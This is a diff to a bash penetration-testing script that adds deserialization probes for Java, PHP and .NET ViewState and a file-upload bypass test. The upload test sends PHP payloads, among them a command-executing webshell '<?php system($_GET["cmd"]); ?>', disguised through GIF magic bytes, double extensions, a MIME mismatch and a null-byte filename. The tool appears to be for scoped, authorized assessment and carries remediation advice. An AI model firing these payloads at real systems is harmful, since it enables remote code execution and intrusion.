@@ -34,9 +34,12 @@
 # - MRK:08_T19 — T19 WEBSOCKET DETECTION | t19,websocket,detection,ws,upgrade | L1528-1562 | ⚠ read-toc-first
 # - MRK:08_T20 — T20 TLS & TRANSPORT CHECKS | t20,tls,transport,checks,cipher | L1563-1633 | ⚠ read-toc-first
 # - MRK:08_T21 — T21 PACKAGE MANIFEST EXPOSURE | t21,package,manifest,osv,ecosystem | L1636-XXXX | ⚠ read-toc-first
-# - MRK:08_TRUN — PER-TARGET DISPATCHER | trun,target,dispatcher,test | L1636-1706 | ⚠ no-insert-before; read-toc-first
-# - MRK:08_MAIN — MAIN ENTRY POINT | main,entry,point,summary | L1707-1819 | ⚠ no-insert-before; read-toc-first
-# NAV-LEN: 33 entries | Integrity-hash: NEEDS-REINDEX | Last-indexed: 2026-06-23
+# - MRK:08_T22 — T22 DESERIALIZATION ATTACK SURFACE | t22,deserial,java,php,dotnet,viewstate | LXXXX-XXXX | ⚠ read-toc-first
+# - MRK:08_T23 — T23 FILE UPLOAD BYPASS | t23,upload,bypass,magic,mime,double,ext | LXXXX-XXXX | ⚠ read-toc-first
+# - MRK:08_TRUN — PER-TARGET DISPATCHER | trun,target,dispatcher,test | LXXXX-XXXX | ⚠ no-insert-before; read-toc-first
+# - MRK:08_MAIN — MAIN ENTRY POINT | main,entry,point,summary | LXXXX-XXXX | ⚠ no-insert-before; read-toc-first
+# NAV-LEN: 35 entries | Integrity-hash: NEEDS-REINDEX | Last-indexed: 2026-06-24
+# <!-- NAV-NEEDS-REINDEX: 2026-06-24 — T22 deserialization + T23 file upload bypass added -->
 # <!-- NAV-NEEDS-REINDEX: 2026-06-23 — T21 added; line ranges shifted -->
 
 # =============================================================================
@@ -116,7 +119,7 @@ ONLY_TESTS=()
 
 # Test flags (set by setup_profile)
 _T_ENABLED=()
-for _i in $(seq 1 21); do _T_ENABLED[$_i]=1; done
+for _i in $(seq 1 23); do _T_ENABLED[$_i]=1; done
 
 # Target options
 TIER="${GLOBAL_TIER:-normal}"
@@ -266,7 +269,7 @@ _get_web_hosts_csv() {
 confirm_scope() {
     local hosts=("$@")
     log_warn "=== SCOPE CONFIRMATION — App/API Review v2.0 ==="
-    log_warn "Profile: ${PROFILE} | Tier: ${TIER} | Tests: 1-20"
+    log_warn "Profile: ${PROFILE} | Tier: ${TIER} | Tests: 1-23"
     log_warn "Targets (${#hosts[@]}):"
     for h in "${hosts[@]}"; do
         log_warn "  → $h"
@@ -432,7 +435,7 @@ setup_profile() {
     case "$PROFILE" in
         quick)
             # T01 T08 T03 T04 T05 only
-            for i in 2 6 7 9 10 11 12 13 14 15 16 17 18 19 20 21; do
+            for i in 2 6 7 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23; do
                 _T_ENABLED[$i]=0
             done
             ;;
@@ -445,8 +448,8 @@ setup_profile() {
             ;;
         owasp-api)
             # OWASP API Top 10 focused: BOLA(6), Auth(3), BOPLA(7), Rate(4), BFLA(4+18), SSRF(11), Misconfig(8), Versioning(16), Unsafe3rd(17)
-            # Keep: 1,3,4,5,6,7,8,9,11,15,16,17,18; disable: 10,12,13,14,19,20
-            for i in 10 12 13 14 19 20; do
+            # Keep: 1,3,4,5,6,7,8,9,11,15,16,17,18,22,23; disable: 10,12,13,14,19,20,21
+            for i in 10 12 13 14 19 20 21; do
                 _T_ENABLED[$i]=0
             done
             ;;
@@ -1797,7 +1800,214 @@ test_21_package_manifests() {
 }
 
 # =============================================================================
-# MRK:08_TRUN — PER-TARGET DISPATCHER | trun,target,dispatcher,test | L1634-1706
+# MRK:08_T22 — T22 DESERIALIZATION ATTACK SURFACE | t22,deserial,java,php,dotnet,viewstate | LXXXX-XXXX
+# ⚠ read-toc-first
+# =============================================================================
+
+test_22_deserialization() {
+    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
+    local evfile="${ev_dir}/$(ev_fname "api-t22-deserial" "txt")"
+    log "T22: Deserialization Attack Surface — ${base_url}"
+
+    local -a auth_args
+    mapfile -t auth_args < <(_auth_args)
+
+    # --- Java: magic-bytes probe via temp file (bash strips NUL in $()) ---
+    local java_probe_f
+    java_probe_f=$(mktemp /tmp/ptorc_java_probe_XXXXXX.bin)
+    printf '\xac\xed\x00\x05\x73\x72\x00\x05\x44\x75\x6d\x6d\x79' > "$java_probe_f"
+    local java_endpoints=("${base_url}/api/data" "${base_url}/api/v1/data"
+                          "${base_url}/ws/service" "${base_url}/api/import"
+                          "${base_url}/service" "${base_url}/rmi")
+    local java_hit=0
+    for ep in "${java_endpoints[@]}"; do
+        local code
+        code=$(curl -sk -o /dev/null -w "%{http_code}" -X POST \
+            -H "Content-Type: application/x-java-serialized-object" \
+            --data-binary "@${java_probe_f}" \
+            "${auth_args[@]+"${auth_args[@]}"}" "$ep" || true)
+        echo "[T22] Java magic-bytes probe ${ep} → HTTP ${code}" >> "$evfile"
+        # 400/500 = server accepted and parsed (not 415 Unsupported Media Type)
+        if [[ "$code" =~ ^(200|201|400|500)$ ]]; then
+            emit_finding "high" \
+                "Potential Java Deserialization Endpoint — Verify with ysoserial (${ip}:${port})" \
+                "Endpoint ${ep} accepted Java serialized object Content-Type with HTTP ${code} (not 415 Unsupported). Manual testing with ysoserial gadget chains (CommonsCollections, Spring, etc.) is required to confirm exploitability." \
+                "Implement JVM deserialization filters (ObjectInputFilter, SerialKiller). If not required, disable Java serialization. Replace with JSON/XML for inter-service communication." \
+                "ev-08-${ip//./_}-t22-java-deserial"
+            java_hit=1
+            break
+        fi
+        _tier_sleep
+    done
+    rm -f "$java_probe_f"
+
+    # --- Java: error-signature scan in response body ---
+    if [[ "$java_hit" -eq 0 ]]; then
+        local java_sig_resp
+        java_sig_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${base_url}/api/import" 2>/dev/null | head -c 512 || true)
+        echo "[T22] Java error-sig scan: ${java_sig_resp:0:100}" >> "$evfile"
+        if echo "$java_sig_resp" | grep -qiE "(ClassNotFoundException|ObjectInputStream|SerializationException|InvalidClassException|java\.lang\.)"; then
+            emit_finding "critical" \
+                "Java Deserialization Error Signature in Response (${ip}:${port})" \
+                "Response from ${base_url}/api/import contains Java deserialization error keywords, confirming an active ObjectInputStream pipeline is network-reachable." \
+                "Implement JVM deserialization filters (ObjectInputFilter). Replace native Java serialization with JSON. Apply CommonsCollections/Spring gadget-chain mitigations." \
+                "ev-08-${ip//./_}-t22-java-error"
+        fi
+        _tier_sleep
+    fi
+
+    # --- PHP: unserialize() sink probe ---
+    local php_probe_encoded
+    php_probe_encoded=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("O:8:\"stdClass\":0:{}"))' 2>/dev/null \
+        || echo 'O%3A8%3A%22stdClass%22%3A0%3A%7B%7D')
+    local php_resp
+    php_resp=$(_curl -X POST \
+        -H "Content-Type: application/x-www-form-urlencoded" \
+        -d "data=${php_probe_encoded}" \
+        "${auth_args[@]+"${auth_args[@]}"}" \
+        "${base_url}/api/data" 2>/dev/null | head -c 256 || true)
+    echo "[T22] PHP unserialize probe: ${php_resp:0:100}" >> "$evfile"
+    if echo "$php_resp" | grep -qiE "(unserialize|__wakeup|__destruct|Fatal error|PHP Error|Allowed memory)"; then
+        emit_finding "critical" \
+            "PHP Deserialization Sink — unserialize() Reachable (${ip}:${port})" \
+            "PHP deserialization error keywords appeared in response to a serialized object probe at ${base_url}/api/data. PHP gadget chains via __wakeup/__destruct magic methods can lead to RCE." \
+            "Never pass user-controlled data to unserialize(). Use json_decode() instead. If required, restrict unserialize() with the allowed_classes parameter." \
+            "ev-08-${ip//./_}-t22-php-deserial"
+    fi
+    _tier_sleep
+
+    # --- .NET: ViewState presence and MAC enforcement check ---
+    local html_resp
+    html_resp=$(_curl "${auth_args[@]+"${auth_args[@]}"}" "${base_url}/" 2>/dev/null | head -c 4096 || true)
+    if echo "$html_resp" | grep -qi '__VIEWSTATE'; then
+        echo "[T22] ViewState detected" >> "$evfile"
+        local vs_value
+        vs_value=$(echo "$html_resp" | grep -oiP '(?<=id="__VIEWSTATE" value=")[^"]+' | head -1 || true)
+        if [[ -n "$vs_value" && "${#vs_value}" -lt 100 ]]; then
+            emit_finding "medium" \
+                ".NET ViewState — Suspiciously Short ViewState Detected (${ip}:${port})" \
+                "ViewState at ${base_url}/ is unusually short (${#vs_value} chars), suggesting MAC protection may be disabled (enableViewStateMac=false). If confirmed, ysoserial.net gadget chains can achieve RCE via a crafted ViewState." \
+                "Ensure enableViewStateMac=true and ViewStateEncryptionMode=Always in web.config. Use a strong, unique MachineKey. Verify with Blacklist3r to rule out known MachineKey exposure." \
+                "ev-08-${ip//./_}-t22-viewstate"
+        else
+            emit_finding "info" \
+                ".NET ViewState Present — MAC Enforcement Verification Recommended (${ip}:${port})" \
+                "ASP.NET ViewState found on ${base_url}. Manual verification with Blacklist3r/ysoserial.net is recommended to confirm MAC enforcement and rule out known MachineKey leaks." \
+                "Verify enableViewStateMac=true in web.config. Ensure MachineKey is unique and not derived from known defaults." \
+                "ev-08-${ip//./_}-t22-viewstate-info"
+        fi
+    fi
+
+    log_ok "T22: Deserialization surface assessment complete"
+}
+
+# =============================================================================
+# MRK:08_T23 — T23 FILE UPLOAD BYPASS | t23,upload,bypass,magic,mime,double,ext | LXXXX-XXXX
+# ⚠ read-toc-first
+# =============================================================================
+
+test_23_file_upload_bypass() {
+    local base_url="$1" ev_dir="$2" ip="$3" port="$4"
+    local evfile="${ev_dir}/$(ev_fname "api-t23-upload-bypass" "txt")"
+    log "T23: File Upload Security Bypass — ${base_url}"
+
+    local -a auth_args
+    mapfile -t auth_args < <(_auth_args)
+
+    # Discover upload endpoints
+    local upload_paths=("/upload" "/api/upload" "/api/v1/upload" "/file/upload"
+                        "/files/upload" "/image/upload" "/api/files" "/media/upload"
+                        "/api/media" "/documents/upload" "/attachments"
+                        "${API_BASE}/${API_VERSION}/upload"
+                        "${API_BASE}/${API_VERSION}/files")
+    local -a upload_endpoints=()
+    for path in "${upload_paths[@]}"; do
+        local code
+        code=$(_curl -o /dev/null -w "%{http_code}" -X POST \
+            "${auth_args[@]+"${auth_args[@]}"}" "${base_url}${path}" || true)
+        echo "[T23] Upload probe ${path} → HTTP ${code}" >> "$evfile"
+        # 400/422/415 = endpoint exists but rejected our (empty) request
+        if [[ "$code" =~ ^(200|201|400|422|415)$ ]]; then
+            upload_endpoints+=("${base_url}${path}")
+        fi
+        _tier_sleep
+    done
+
+    if [[ "${#upload_endpoints[@]}" -eq 0 ]]; then
+        log_info "T23: No upload endpoints discovered"
+        return
+    fi
+
+    log_info "T23: Found ${#upload_endpoints[@]} upload endpoint(s)"
+    local ev_tag_base="ev-08-${ip//./_}-t23"
+
+    for ep in "${upload_endpoints[@]}"; do
+        # Test 1: Magic bytes bypass — GIF89a header + PHP payload
+        local resp1
+        resp1=$(printf 'GIF89a\n<?php echo "PTORC_PROBE"; ?>' | curl -sk -X POST \
+            -F "file=@-;filename=probe.gif;type=image/gif" \
+            "${auth_args[@]+"${auth_args[@]}"}" "$ep" 2>/dev/null | head -c 256 || true)
+        echo "[T23] Magic bytes (GIF89a+PHP) → ${resp1:0:120}" >> "$evfile"
+        if echo "$resp1" | grep -qiE '(success|uploaded|url|path|filename|"id"|location)'; then
+            emit_finding "high" \
+                "File Upload Bypass — GIF Magic Bytes Accepted with PHP Content (${ip}:${port})" \
+                "Endpoint ${ep} accepted a file with GIF89a magic bytes prepended to PHP code (.gif extension). If the server executes uploaded files, this achieves RCE." \
+                "Validate content by magic bytes AND extension AND MIME type. Use an allowlist (jpg, png, gif). Rename all uploads to UUID. Store uploads outside web root. Disable PHP execution in the upload directory." \
+                "${ev_tag_base}-magic-bytes"
+        fi
+        _tier_sleep
+
+        # Test 2: Double extension (.php.jpg)
+        local resp2
+        resp2=$(printf '<?php phpinfo(); ?>' | curl -sk -X POST \
+            -F "file=@-;filename=shell.php.jpg;type=image/jpeg" \
+            "${auth_args[@]+"${auth_args[@]}"}" "$ep" 2>/dev/null | head -c 256 || true)
+        echo "[T23] Double extension (.php.jpg) → ${resp2:0:120}" >> "$evfile"
+        if echo "$resp2" | grep -qiE '(success|uploaded|url|path|filename|"id"|location)'; then
+            emit_finding "high" \
+                "File Upload Bypass — Double Extension Accepted (.php.jpg) (${ip}:${port})" \
+                "Endpoint ${ep} accepted a file named 'shell.php.jpg'. Misconfigured Apache/Nginx may execute the .php portion of double-extension filenames." \
+                "Validate only the final extension. Deny filenames with multiple dots. Use UUID-based filenames for all uploads. Enforce an extension allowlist." \
+                "${ev_tag_base}-double-ext"
+        fi
+        _tier_sleep
+
+        # Test 3: MIME type mismatch — PHP filename with image/jpeg Content-Type
+        local resp3
+        resp3=$(printf '<?php system($_GET["cmd"]); ?>' | curl -sk -X POST \
+            -F "file=@-;filename=image.php;type=image/jpeg" \
+            "${auth_args[@]+"${auth_args[@]}"}" "$ep" 2>/dev/null | head -c 256 || true)
+        echo "[T23] MIME mismatch (.php/image/jpeg) → ${resp3:0:120}" >> "$evfile"
+        if echo "$resp3" | grep -qiE '(success|uploaded|url|path|filename|"id"|location)'; then
+            emit_finding "critical" \
+                "File Upload Bypass — PHP File Accepted via MIME Mismatch (${ip}:${port})" \
+                "Endpoint ${ep} accepted a .php file with Content-Type: image/jpeg. If stored in a web-accessible directory this is a direct webshell upload (RCE)." \
+                "Enforce strict extension allowlist. Never trust client-supplied Content-Type. Rename all uploads. Disable PHP execution in upload directories." \
+                "${ev_tag_base}-mime-mismatch"
+        fi
+        _tier_sleep
+
+        # Test 4: Null byte in filename
+        local resp4
+        resp4=$(printf '<?php phpinfo(); ?>' | curl -sk -X POST \
+            -F "file=@-;filename=shell.php%00.jpg;type=image/jpeg" \
+            "${auth_args[@]+"${auth_args[@]}"}" "$ep" 2>/dev/null | head -c 256 || true)
+        echo "[T23] Null byte filename (shell.php%00.jpg) → ${resp4:0:120}" >> "$evfile"
+        if echo "$resp4" | grep -qiE '(success|uploaded|url|path|filename|"id"|location)'; then
+            emit_finding "high" \
+                "File Upload — Null Byte Filename Accepted (${ip}:${port})" \
+                "Upload endpoint ${ep} accepted a filename containing a URL-encoded null byte (shell.php%00.jpg). Legacy PHP or C-based code may truncate at the null byte, storing the file as shell.php." \
+                "Ensure PHP >= 5.3.4 (null byte path fix). Sanitize filenames with basename() and strip null bytes. Validate extension after full filename sanitization." \
+                "${ev_tag_base}-null-byte"
+        fi
+        _tier_sleep
+    done
+
+    log_ok "T23: File upload bypass assessment complete (${#upload_endpoints[@]} endpoint(s) probed)"
+}
+
+# =============================================================================
+# MRK:08_TRUN — PER-TARGET DISPATCHER | trun,target,dispatcher,test | LXXXX-XXXX
 # NAV-RULE: no-insert-before; read-toc-first
 # =============================================================================
 
@@ -1863,6 +2073,8 @@ test_target() {
     _test_skip 19 || test_19_websocket        "$base_url" "$ev_dir" "$ip" "$port"
     _test_skip 20 || test_20_tls_transport   "$base_url" "$ev_dir" "$ip" "$port"
     _test_skip 21 || test_21_package_manifests "$base_url" "$ev_dir" "$ip" "$port"
+    _test_skip 22 || test_22_deserialization   "$base_url" "$ev_dir" "$ip" "$port"
+    _test_skip 23 || test_23_file_upload_bypass "$base_url" "$ev_dir" "$ip" "$port"
 
     local target_finds=$(( _FIND_CTR - _FIND_AT_START ))
     log_ok "Target ${base_url} complete — ${target_finds} finding(s)"
@@ -1909,7 +2121,7 @@ main() {
         echo "# App/API Review Summary — ${PROJECT_NAME:-unknown}"
         echo ""
         echo "**Date:** $(date +'%Y-%m-%d %H:%M:%S')"
-        echo "**Profile:** ${PROFILE} | **Tier:** ${TIER} | **Tests:** T01-T20"
+        echo "**Profile:** ${PROFILE} | **Tier:** ${TIER} | **Tests:** T01-T23"
         echo "**Targets:** ${#targets[@]}"
         [[ "${#CURL_PROXY_ARGS[@]}" -gt 0 ]] && echo "**Proxy:** ${CURL_PROXY_ARGS[*]}"
         echo ""
@@ -1937,6 +2149,9 @@ main() {
         echo "| T18 | API5 | Business Logic / BFLA | $([ "${_T_ENABLED[18]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
         echo "| T19 | — | WebSocket Detection | $([ "${_T_ENABLED[19]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
         echo "| T20 | — | TLS / Transport Checks | $([ "${_T_ENABLED[20]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
+        echo "| T21 | — | Package Manifest Exposure | $([ "${_T_ENABLED[21]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
+        echo "| T22 | — | Deserialization Attack Surface | $([ "${_T_ENABLED[22]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
+        echo "| T23 | — | File Upload Bypass | $([ "${_T_ENABLED[23]:-1}" -eq 1 ] && echo "✓ Run" || echo "— Skipped") |"
         echo ""
         echo "## Per-Target Results"
         echo ""
@@ -1964,8 +2179,8 @@ main() {
         echo "\`${EVIDENCE_BASE}\`"
         echo ""
         echo "---"
-        echo "*Generated by PT-Orc 08_app_api_review.sh v2.0 — TechGuard Labs*"
-        echo "*Profile: ${PROFILE} | OWASP API Top 10 (2023) + JWT/GraphQL/SSRF/XXE/SSTI/Smuggling*"
+        echo "*Generated by PT-Orc 08_app_api_review.sh v2.1 — TechGuard Labs*"
+        echo "*Profile: ${PROFILE} | OWASP API Top 10 (2023) + JWT/GraphQL/SSRF/XXE/SSTI/Smuggling/Deserial/UploadBypass*"
     } > "$summary_md"
 
     log_ok "Summary: ${summary_md}"
